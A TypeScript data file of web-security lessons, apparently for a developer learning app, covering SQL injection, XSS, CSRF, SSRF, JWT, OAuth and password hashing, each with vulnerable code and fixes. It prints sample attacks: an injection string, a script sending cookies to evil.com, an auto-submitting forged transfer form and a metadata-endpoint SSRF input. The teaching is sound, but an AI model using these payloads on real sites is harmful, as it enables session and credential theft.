import type { RoadmapDetailMap } from './types';

export const SecurityContent: RoadmapDetailMap = {
	'SQL Injection': {
		definition:
			'A vulnerability where an attacker manipulates user input to alter the structure of a SQL query, potentially reading or destroying data they should never have access to.',
		useCase:
			'A login form that builds SQL by string concatenation lets an attacker log in without a valid password.',
		detailedMarkdown: `
# SQL Injection

**SQL Injection** happens when user input is concatenated directly into a SQL query string, letting an attacker inject their own SQL logic.

## Vulnerable Code
\`\`\`javascript
const query = \`SELECT * FROM users WHERE username = '\\\${username}' AND password = '\\\${password}'\`;
db.execute(query);
\`\`\`

## The Attack
An attacker submits this as the username:
\`\`\`sql
' OR '1'='1
\`\`\`
The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
\`\`\`
\`'1'='1'\` is always true, so the \`WHERE\` clause matches every row — the attacker is logged in as the first user in the table, no valid password required. Worse payloads can drop tables or exfiltrate entire columns via \`UNION SELECT\`.

## The Fix: Parameterized Queries
\`\`\`javascript
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
\`\`\`
The database driver sends the query structure and the user-supplied values **separately** — the value is never interpreted as SQL syntax, no matter what characters it contains.

> **Golden Rule:** Never build a SQL string by concatenating raw user input. Always use parameterized queries / prepared statements. Most ORMs (Prisma, Sequelize, ActiveRecord) do this automatically — another good reason to prefer them over raw string-built SQL.
		`
	},
	XSS: {
		definition:
			"A vulnerability where an attacker injects malicious JavaScript into a page viewed by other users, running in their browser with their session's privileges.",
		useCase:
			"A comment box that renders user input as raw HTML lets an attacker steal every visitor's session cookie.",
		detailedMarkdown: `
# XSS (Cross-Site Scripting)

**XSS** lets an attacker run their own JavaScript inside another user's browser session, on your domain — with access to that user's cookies, DOM, and everything they can do on the page.

## The Three Types
- **Stored XSS** — the malicious script is saved on the server (e.g. in a comment) and served to every future visitor.
- **Reflected XSS** — the script comes from the current request (e.g. a search query param) and is immediately reflected back into the response.
- **DOM-based XSS** — the vulnerability lives entirely in client-side JavaScript that unsafely writes attacker-controlled data into the DOM.

## Vulnerable Code
\`\`\`javascript
// Rendering a comment directly as HTML
commentDiv.innerHTML = comment.text;
\`\`\`
If \`comment.text\` is \`<script>fetch('https://evil.com?cookie=' + document.cookie)</script>\`, it executes for every visitor who views that comment.

## The Fix
1. **Escape/encode output** — render user content as text, not HTML: \`commentDiv.textContent = comment.text;\`
2. **Auto-escaping frameworks** — React, Vue, and Svelte escape interpolated content by default (\`{comment.text}\`); the danger is explicit escape-hatches like React's \`dangerouslySetInnerHTML\`.
3. **Content-Security-Policy header** — restricts which script sources the browser will even execute, as defense-in-depth if an escaping bug slips through.

\`\`\`
Content-Security-Policy: script-src 'self'
\`\`\`

> **Golden Rule:** Treat all user input as untrusted text, never as HTML, unless it has gone through an explicit, well-tested sanitizer (e.g. DOMPurify) for the rare legitimate case of allowing limited rich text.
		`
	},
	CSRF: {
		definition:
			"A vulnerability where an attacker tricks a logged-in user's browser into unknowingly submitting a state-changing request to a site the user is authenticated with.",
		useCase:
			'A malicious page that auto-submits a hidden form to your bank\'s \\"transfer funds\\" endpoint while you\'re still logged in.',
		detailedMarkdown: `
# CSRF (Cross-Site Request Forgery)

**CSRF** exploits the fact that browsers automatically attach cookies to requests, regardless of which site initiated them.

## The Attack Scenario
You're logged into \`bank.com\` (your session cookie is set). You then visit \`evil.com\`, which contains:
\`\`\`html
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById('f').submit();</script>
\`\`\`
Your browser submits this form to \`bank.com\` **with your session cookie attached automatically** — from the bank's server's point of view, it looks like a legitimate, authenticated request from you.

## Defenses
1. **CSRF Tokens** — the server embeds a random, per-session token in every form; the request is rejected unless that exact token is echoed back. \`evil.com\` has no way to read or guess it.
2. **SameSite Cookies** — setting \`Set-Cookie: session=...; SameSite=Lax\` (or \`Strict\`) tells the browser not to send the cookie on cross-site requests in the first place — see the *Cookies* entry for the full flag breakdown. This alone blocks most CSRF attacks in modern browsers.
3. **Checking the \`Origin\`/\`Referer\` header** on state-changing requests as a secondary check.

## Why This Only Affects State-Changing Requests
A pure \`GET\` request that only *reads* data (and has no side effects) is a much lower-value CSRF target — this is exactly why REST conventions matter for security, not just style: \`GET\` should never mutate state (see *HTTP Methods*).
		`
	},
	SSRF: {
		definition:
			"A vulnerability where an attacker tricks a server into making HTTP requests to internal or unintended destinations on the attacker's behalf.",
		useCase:
			'A \\"fetch image from URL\\" feature abused to make your server request AWS\'s internal metadata endpoint and leak cloud credentials.',
		detailedMarkdown: `
# SSRF (Server-Side Request Forgery)

**SSRF** happens when a feature that fetches a URL on the server's behalf (image proxies, webhook validators, PDF generators, "import from URL" buttons) is tricked into requesting a destination the developer never intended.

## The Attack Scenario
\`\`\`javascript
// Vulnerable: fetches whatever URL the user supplies, from the server itself
app.post('/fetch-avatar', async (req, res) => {
  const response = await fetch(req.body.imageUrl);
  res.send(await response.buffer());
});
\`\`\`
An attacker submits \`imageUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"\` — AWS's internal instance metadata endpoint, reachable only from *inside* the cloud VM. Your public-facing server dutifully fetches it and returns the response, potentially leaking temporary IAM credentials to the attacker. The same trick can reach internal admin panels, databases, or other services that were never meant to be internet-exposed.

## Defenses
1. **Allowlist destinations** — if the feature is meant to fetch user avatars from a known set of image hosts, validate the URL's host against an explicit allowlist rather than accepting anything.
2. **Block internal/private IP ranges** — reject requests resolving to \`localhost\`, \`169.254.0.0/16\` (cloud metadata), \`10.0.0.0/8\`, \`172.16.0.0/12\`, \`192.168.0.0/16\` — and re-check *after* DNS resolution, since an attacker can register a public domain that resolves to a private IP.
3. **Network segmentation** — the fetching service shouldn't have network-level access to sensitive internal endpoints in the first place (defense in depth beyond just app-level validation).
4. **Disable unneeded URL schemes** — restrict to \`http\`/\`https\` only; \`file://\`, \`gopher://\`, etc. open other attack classes entirely.

> SSRF has become increasingly dangerous specifically *because* of cloud metadata endpoints — it's a top real-world cause of cloud credential leaks, which is why it's on the *OWASP Top 10*.
		`
	},
	HTTPS: {
		definition:
			"The security-critical practice of encrypting HTTP traffic with TLS so it can't be read or tampered with in transit.",
		useCase:
			'Preventing someone on the same public WiFi network from reading your login credentials as they travel over the network.',
		detailedMarkdown: `
# HTTPS (Security Angle)

Plain **HTTP** sends everything — including passwords, session cookies, and page content — as readable plaintext over the network. **HTTPS** wraps HTTP in TLS encryption (see *SSL/TLS* for the protocol mechanics); this entry focuses on *why it matters* from a security standpoint.

## What Plain HTTP Exposes You To
- **Eavesdropping** — anyone on the network path (a shared WiFi network, a compromised router, an ISP) can read every request and response, including credentials and session cookies, in plaintext.
- **Man-in-the-Middle (MITM) tampering** — an attacker on the network path can *modify* traffic in transit — injecting malicious JavaScript into an HTTP page, or redirecting a software download to malware.

## What HTTPS Actually Protects Against
1. **Confidentiality** — traffic is encrypted, so eavesdroppers see only gibberish.
2. **Integrity** — any tampering with the encrypted data in transit is detectable and the connection is rejected.
3. **Authentication** — the TLS certificate proves you're actually talking to the real \`bank.com\`, not an impostor server (assuming certificate validation isn't bypassed).

## HSTS (HTTP Strict Transport Security)
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains
\`\`\`
Without HSTS, a user's *first* request to \`http://bank.com\` (before any redirect to HTTPS happens) is a brief window an attacker can intercept and strip the upgrade (an "SSL stripping" attack). HSTS tells the browser to **never** attempt a plain-HTTP connection to this domain again, closing that window entirely.

## Certificate Validation Matters
An expired, self-signed, or mismatched-domain certificate isn't just an annoying browser warning — clicking through it defeats the authentication guarantee entirely, since you can no longer be sure who you're actually encrypting traffic *to*.

> In production, plain HTTP for any endpoint handling credentials, sessions, or personal data isn't a minor gap — it's a baseline OWASP-level failure.
		`
	},
	'JWT Security': {
		definition:
			'The set of common implementation mistakes and defenses specific to using JSON Web Tokens for authentication.',
		useCase:
			'Preventing an attacker from forging a valid-looking admin token by exploiting a weak signature check.',
		detailedMarkdown: `
# JWT Security

JWTs (see the *JWT* entry for the basic structure) are widely used, and widely *misused*. Here are the real-world vulnerabilities that come up again and again.

## 1. The \`alg: none\` Attack
Some early JWT libraries trusted the \`alg\` field inside the token itself to decide how to verify it. An attacker could craft a token with \`"alg": "none"\` and no signature at all — and a naive verifier would accept it as valid.
**Fix:** always explicitly specify the expected algorithm when verifying (\`jwt.verify(token, secret, { algorithms: ['HS256'] })\`) — never let the token dictate its own verification method.

## 2. Algorithm Confusion (RS256 → HS256)
If a server verifies with \`HS256\` (a shared secret) but the *public* RS256 verification key is, well, public — an attacker can sign a forged token using the public key as an HMAC secret, and a misconfigured verifier that doesn't pin the expected algorithm will accept it.
**Fix:** same as above — pin the exact algorithm expected.

## 3. Weak or Leaked Signing Secrets
An HS256 secret that's short, guessable, or accidentally committed to a public repo lets an attacker forge arbitrary tokens — including one claiming to be an admin.
**Fix:** use a long, high-entropy secret (or asymmetric RS256/ES256 keys), stored in a secrets manager, never in source code.

## 4. Sensitive Data in the Payload
A JWT is **signed, not encrypted** — anyone can base64-decode the payload and read it, they just can't *modify* it undetected.
\`\`\`javascript
// The payload of any JWT is trivially readable:
JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
\`\`\`
**Fix:** never put passwords, SSNs, or other sensitive data directly in the payload.

## 5. Missing Expiry / No Revocation
A JWT with no \`exp\` claim (or a very long one) that's stolen remains valid indefinitely, and — unlike a server-side session — you can't simply delete it from a database to revoke it.
**Fix:** keep expiry short, and pair with a refresh-token flow (a longer-lived, revocable token used only to mint new short-lived access tokens).
		`
	},
	'Password Hashing': {
		definition:
			"The practice of transforming passwords with a slow, salted, one-way algorithm before storing them, so a database breach doesn't expose usable plaintext passwords.",
		useCase: "Ensuring a leaked users table doesn't let attackers instantly log in as every user.",
		detailedMarkdown: `
# Password Hashing

## Never Store Plaintext
If your \`users\` table is ever breached (and eventually, some database somewhere always is), storing plaintext passwords means instant, total compromise of every account — including on any *other* site where a user reused that password.

## Never Use Fast General-Purpose Hashes Either
\`\`\`javascript
// WRONG — MD5/SHA-1/SHA-256 are FAST, designed for speed, not password storage
const hash = sha256(password);
\`\`\`
Fast hashes are exactly wrong for passwords: modern GPUs can compute billions of SHA-256 hashes per second, making a **brute-force / dictionary attack** against a leaked hash list trivially fast. Fast hashes are also vulnerable to **rainbow tables** — precomputed hash-to-password lookup tables — unless salted.

## The Correct Approach: Slow, Salted, Adaptive Hashing
Use an algorithm *designed* to be slow and resistant to hardware acceleration: **bcrypt**, **scrypt**, or **Argon2** (the current recommended default).

\`\`\`javascript
const bcrypt = require('bcrypt');

// Hashing at signup — bcrypt generates and embeds a random salt automatically
const hash = await bcrypt.hash(password, 12); // 12 = cost factor

// Verifying at login
const isValid = await bcrypt.compare(enteredPassword, storedHash);
\`\`\`

## Why "Salted" Matters
A **salt** is random data mixed into the password before hashing, unique per user. Without it, two users with the same password ("password123") get the *identical* hash, and an attacker's precomputed rainbow table works against your whole database at once. With a unique salt per user, the same password produces a completely different hash for every user — rainbow tables become useless.

## Why "Adaptive" (Cost Factor) Matters
bcrypt/Argon2 have a tunable **cost factor** controlling how many rounds of internal work each hash takes. As hardware gets faster, you increase the cost factor — keeping the *time* to brute-force a hash roughly constant even as computing power grows.
		`
	},
	'OAuth Security': {
		definition:
			"The common implementation mistakes that undermine OAuth 2.0's security guarantees, and how to avoid them.",
		useCase:
			'Preventing an attacker from hijacking a "Login with Google" flow via a missing state parameter.',
		detailedMarkdown: `
# OAuth Security

OAuth (see the *OAuth* entry for the basic Authorization Code flow) is secure by design — but only if implemented correctly. These are the mistakes that actually show up in real breaches.

## 1. Missing \`state\` Parameter (CSRF on the Auth Flow)
The \`state\` parameter is meant to be a random, unguessable value the client generates before redirecting to the authorization server, then verifies matches on the callback.
Without it, an attacker can initiate their *own* OAuth flow, capture the resulting authorization code, and trick a victim into completing the callback with the attacker's code — linking the victim's session to the *attacker's* third-party account (a real CSRF-style attack on the login flow itself).
**Fix:** always generate, store, and verify a random \`state\` value across the redirect round-trip.

## 2. Open \`redirect_uri\` Validation
If the authorization server accepts *any* \`redirect_uri\` the client requests (or only loosely matches it, e.g. by prefix), an attacker can register their own callback URL and steal the authorization code/token meant for the legitimate app.
**Fix:** the authorization server should require an **exact match** against a pre-registered allowlist of redirect URIs — no wildcards, no prefix matching.

## 3. Using the (Deprecated) Implicit Flow
The Implicit Flow returned the access token directly in the URL fragment — exposed in browser history, server logs, and referrer headers.
**Fix:** use the **Authorization Code flow with PKCE** (Proof Key for Code Exchange) instead, even for public clients like SPAs and mobile apps — PKCE adds a dynamically generated secret that proves the app exchanging the code is the same one that started the flow, closing the gap the Implicit Flow left open.

## 4. Insufficient Scope Restriction
Requesting broader scopes than the app actually needs ("full account access" when you only need to read the user's email) increases the blast radius if the app or its stored tokens are ever compromised.
**Fix:** request the minimum scope necessary (principle of least privilege — same idea as *IAM*).
		`
	},
	'OWASP Top 10': {
		definition:
			"The Open Web Application Security Project's regularly updated, industry-standard list of the most critical web application security risks.",
		useCase:
			'The baseline checklist every backend engineer is expected to know, especially before a security-focused interview round.',
		detailedMarkdown: `
# OWASP Top 10

The **OWASP Top 10** (2021 edition, the current stable list) is the standard reference for "what should every engineer at least be aware of." Several of these already have their own dedicated deep-dive entries in this app — noted below.

## The List
1. **A01: Broken Access Control** — users acting outside their intended permissions (e.g. accessing another user's data by simply changing an ID in the URL). See *Authorization*.
2. **A02: Cryptographic Failures** — weak/missing encryption for sensitive data in transit or at rest. See *HTTPS*, *Password Hashing*.
3. **A03: Injection** — untrusted input altering a query/command's structure. See *SQL Injection*; also applies to command injection, LDAP injection, etc.
4. **A04: Insecure Design** — security flaws baked into the architecture itself, not fixable by a patch (e.g. no rate limiting on a password-reset endpoint at all, by design).
5. **A05: Security Misconfiguration** — default credentials left enabled, verbose error messages leaking stack traces, unnecessary features/ports exposed.
6. **A06: Vulnerable and Outdated Components** — using a library/dependency with a known CVE that's never been patched.
7. **A07: Identification and Authentication Failures** — weak password policies, missing brute-force protection, broken session management. See *Authentication*, *JWT Security*.
8. **A08: Software and Data Integrity Failures** — trusting data/updates/plugins from an untrusted source without verifying integrity (e.g. a supply-chain attack via a compromised npm package).
9. **A09: Security Logging and Monitoring Failures** — breaches going undetected for months because nobody was watching for the signs. See *Monitoring*.
10. **A10: Server-Side Request Forgery (SSRF)** — see the dedicated *SSRF* entry.

## Using This List in an Interview
You're rarely asked to recite the list verbatim — you're asked to **apply** it: "what security concerns would you flag reviewing this API design?" A strong answer touches concrete items from this list (injection risk on that raw query, missing authorization check on that endpoint) rather than vague statements like "we should be secure."
		`
	}
};
